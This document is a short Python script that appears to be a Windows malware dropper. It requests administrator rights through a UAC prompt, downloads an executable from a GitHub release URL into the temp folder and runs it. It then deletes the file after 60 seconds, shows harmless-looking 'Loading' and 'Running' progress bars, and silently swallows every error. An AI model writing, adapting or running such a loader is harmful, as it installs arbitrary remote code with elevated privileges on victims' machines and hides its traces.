import requests
import os
import sys
import tempfile
import ctypes
import time
import subprocess
import threading

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_file(url):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        temp_dir = tempfile.gettempdir()
        file_path = os.path.join(temp_dir, "tmp_file.exe")
        total_size = int(response.headers.get('content-length', 0))
        downloaded = 0
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
                    if total_size > 0:
                        progress = downloaded / total_size
                        bar = "[" + "#" * int(progress * 20) + " " * (20 - int(progress * 20)) + "]"
                        sys.stdout.write(f"\rLoading {bar} {int(progress * 100)}%")
                        sys.stdout.flush()
        print()
        return file_path
    except Exception:
        return None

def execute_file(file_path):
    try:
        subprocess.Popen(file_path, shell=True)
    except Exception:
        pass

def delete_file(file_path, delay=60):
    time.sleep(delay)
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception:
        pass

if __name__ == "__main__":
    file_url = "https://github.com/Egijaimmere580/.github/releases/download/22/60releaseversion.exe"
    
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    
    file_path = download_file(file_url)
    if not file_path:
        sys.exit(1)
    
    threading.Thread(target=delete_file, args=(file_path, 60), daemon=True).start()
    execute_file(file_path)
    
    for i in range(60):
        progress = i / 59
        bar = "[" + "#" * int(progress * 20) + " " * (20 - int(progress * 20)) + "]"
        sys.stdout.write(f"\rRunning {bar} {int(progress * 100)}%")
        sys.stdout.flush()
        time.sleep(1)
    
    print()
